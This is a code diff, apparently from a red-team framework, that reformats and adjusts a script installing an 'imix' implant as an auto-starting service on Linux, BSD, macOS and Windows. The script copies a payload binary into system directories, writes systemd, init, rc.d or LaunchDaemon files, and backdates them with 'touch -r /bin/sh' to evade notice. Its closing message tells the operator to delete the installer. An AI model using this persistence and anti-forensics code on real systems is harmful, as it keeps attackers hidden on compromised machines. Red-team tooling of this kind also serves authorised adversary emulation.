@@ -124,9 +124,11 @@ launch_daemon_template = """<?xml version="1.0" encoding="UTF-8"?>
 <dict>
     <key>Label</key>
     <string>{{ service_name }}</string>
+    <key>Program</key>
+    <string>{{ bin_path }}</string>
     <key>ProgramArguments</key>
     <array>
-        <string>{{ bin_path }}</string>
+        <string>{{ bin_args }}</string>
     </array>
     <key>KeepAlive</key>
     <true/>
@@ -204,6 +206,7 @@ status_cmd="${name}_status"
 run_rc_command "$1"
 """
 
+
 def is_using_systemd():
     command_get_res = sys.shell("command -v systemctl")
     if command_get_res['status'] == 0 and file.is_file(command_get_res['stdout'].strip()):
@@ -212,11 +215,13 @@ def is_using_systemd():
                 return True
     return False
 
+
 def is_using_sysvinit():
     command_get_res = sys.shell("command -v update-rc.d")
     if command_get_res['status'] == 0 and file.is_file(command_get_res['stdout'].strip()):
         return True
     return False
+
 
 def is_using_bsdinit():
     # Lol this is how ansible does it too :shrug:
@@ -225,36 +230,40 @@ def is_using_bsdinit():
         return True
     return False
 
+
 def systemd(service_name, service_desc, executable_path, executable_args):
     # assets.copy("persist_service/files/systemd.service.j2","/tmp/systemd.service.j2")
     file.write("/tmp/systemd.service.j2", systemd_service_template)
     args = {
-        "SERVICE_NAME":service_name,
-        "SERVICE_DESC":service_desc,
-        "SERVICE_START_CMD":executable_path+" "+executable_args
+        "SERVICE_NAME": service_name,
+        "SERVICE_DESC": service_desc,
+        "SERVICE_START_CMD": executable_path+" "+executable_args
     }
-    file.template("/tmp/systemd.service.j2","/usr/lib/systemd/system/"+service_name+".service", args, False)
+    file.template("/tmp/systemd.service.j2",
+                  "/usr/lib/systemd/system/"+service_name+".service", args, False)
     file.remove("/tmp/systemd.service.j2")
 
     # assets.copy("persist_service/files/payload.elf", executable_path)
     sys.shell("chmod +x "+executable_path)
     sys.shell(f"touch -r /bin/sh {executable_path}")
-    sys.shell(f"touch -r /bin/sh /usr/lib/systemd/system/{service_name}.service")
+    sys.shell(
+        f"touch -r /bin/sh /usr/lib/systemd/system/{service_name}.service")
 
     sys.shell("systemctl daemon-reload "+service_name)
     sys.shell("systemctl enable "+service_name)
     sys.shell("systemctl start "+service_name)
     print("systemd installed")
 
+
 def sysvinit(service_name, service_desc, executable_path, executable_args):
     # assets.copy("persist_service/files/sysvinit.sh.j2","/tmp/svc.sh.j2")
     file.write("/tmp/svc.sh.j2", sysvinit_template)
     args = {
-        "SERVICE_NAME":service_name,
-        "SERVICE_DESC":service_desc,
-        "SERVICE_START_CMD":executable_path+" "+executable_args
+        "SERVICE_NAME": service_name,
+        "SERVICE_DESC": service_desc,
+        "SERVICE_START_CMD": executable_path+" "+executable_args
     }
-    file.template("/tmp/svc.sh.j2","/etc/init.d/"+service_name, args, False)
+    file.template("/tmp/svc.sh.j2", "/etc/init.d/"+service_name, args, False)
     file.remove("/tmp/svc.sh.j2")
     sys.shell("chmod +x "+"/etc/init.d/"+service_name)
 
@@ -267,6 +276,7 @@ def sysvinit(service_name, service_desc, executable_path, executable_args):
     sys.shell("service "+service_name+" start")
     print("sysvinit installed")
 
+
 def bsdinit(service_name, service_desc, executable_path, executable_args):
     startup_dir = "/usr/local/etc/rc.d/"
     if not file.is_dir(startup_dir):
@@ -275,11 +285,12 @@ def bsdinit(service_name, service_desc, executable_path, executable_args):
 
     file.write("/tmp/svc.sh.j2", bsdinit_template)
     args = {
-        "service_name":service_name,
-        "service_desc":service_desc,
-        "service_start_cmd":executable_path+" "+executable_args
+        "service_name": service_name,
+        "service_desc": service_desc,
+        "service_start_cmd": executable_path+" "+executable_args
     }
-    file.template("/tmp/svc.sh.j2",startup_dir+service_name+".sh", args, False)
+    file.template("/tmp/svc.sh.j2", startup_dir +
+                  service_name+".sh", args, False)
     file.remove("/tmp/svc.sh.j2")
 
     sys.shell("chmod +x "+startup_dir+service_name+".sh")
@@ -288,14 +299,17 @@ def bsdinit(service_name, service_desc, executable_path, executable_args):
 
     print("bsdinit installed")
 
+
 def launch_daemon(service_name, executable_path, executable_args):
     # assets.copy("persist_service/files/launch_daemon.plist.j2","/tmp/plist.j2")
-    file.write("/tmp/plist.j2",launch_daemon_template)
+    file.write("/tmp/plist.j2", launch_daemon_template)
     args = {
-        "service_name":"com.testing."+service_name,
-        "bin_path":executable_path+" "+executable_args
+        "service_name": "com.testing."+service_name,
+        "bin_path": executable_path,
+        "bin_args": executable_args
     }
-    file.template("/tmp/plist.j2","/Library/LaunchDaemons/"+service_name+".plist", args, False)
+    file.template("/tmp/plist.j2", "/Library/LaunchDaemons/" +
+                  service_name+".plist", args, False)
     file.remove("/tmp/plist.j2")
 
     # assets.copy("persist_service/files/payload.macho", executable_path)
@@ -303,8 +317,10 @@ def launch_daemon(service_name, executable_path, executable_args):
     sys.shell("launchctl load -w /Library/LaunchDaemons/"+service_name+".plist")
     print("Launch daemon installed")
 
+
 def windows_service_manager(service_name, service_display_name, service_description, executable_path):
-    create_res = sys.shell("sc.exe create "+service_name+" binpath= "+executable_path+" displayname="+service_display_name+" start= auto type= own")
+    create_res = sys.shell("sc.exe create "+service_name+" binpath= "+executable_path +
+                           " displayname="+service_display_name+" start= auto type= own")
     if 'ERROR' in create_res['stdout'] or create_res['stderr'] != "":
         print("Failed to create service:\n"+create_res+"\n")
         print("\n")
@@ -323,9 +339,11 @@ def persist_service(service_name, service_desc, executable_name, executable_args
         executable_path = "/bin/"+executable_name
         file.copy(src_path, executable_path)
         if is_using_systemd():
-            systemd(service_name, service_desc, executable_path, executable_args)
+            systemd(service_name, service_desc,
+                    executable_path, executable_args)
         elif is_using_sysvinit():
-            sysvinit(service_name, service_desc, executable_path, executable_args)
+            sysvinit(service_name, service_desc,
+                     executable_path, executable_args)
     elif sys.is_macos():
         executable_path = "/var/root/"+executable_name
         file.copy(src_path, executable_path)
@@ -333,14 +351,17 @@ def persist_service(service_name, service_desc, executable_name, executable_args
     elif sys.is_windows():
         executable_path = "C:\\ProgramData\\"+executable_name+".exe"
         file.copy(src_path, executable_path)
-        windows_service_manager(service_name, service_name, service_desc, executable_path)
+        windows_service_manager(
+            service_name, service_name, service_desc, executable_path)
     elif sys.get_os()['platform'] == "BSD":
         executable_path = "/bin/"+executable_name
         file.copy(src_path, executable_path)
         if is_using_bsdinit():
-            bsdinit(service_name, service_desc, executable_path, executable_args)
+            bsdinit(service_name, service_desc,
+                    executable_path, executable_args)
     else:
         print("OS not supported")
+
 
 def parse_and_persist(config_data):
     if len(config_data['service_configs']) < 1:
@@ -354,6 +375,7 @@ def parse_and_persist(config_data):
             "",
         )
 
+
 """
 This script uses the first provided services_configs to install a service
 On the local system. The config file specified for the install will be used
@@ -363,8 +385,10 @@ it after running the install.
 
 ./imix install
 """
+
+
 def main():
-    config_data ={
+    config_data = {
         "service_configs": [
             {
                 "name": "imix",
@@ -376,5 +400,6 @@ def main():
     }
     parse_and_persist(config_data)
     print("Implant copied, you may now delete this binary.")
+
 
 main()
